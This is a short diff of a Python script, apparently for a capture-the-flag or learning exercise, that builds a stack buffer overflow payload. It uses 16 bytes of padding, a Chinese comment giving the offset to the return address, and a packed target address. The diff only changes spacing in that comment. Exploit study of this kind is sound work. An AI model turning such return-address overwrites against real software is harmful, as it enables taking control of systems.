@@ -1,6 +1,6 @@
 import struct
 
-# 从rbp - 8到ret_adddress是16字节
+# 从rbp-8到ret_adddress是16字节
 padding = b'A' * 16
 
 target_addr = struct.pack('<Q', 0x401216)
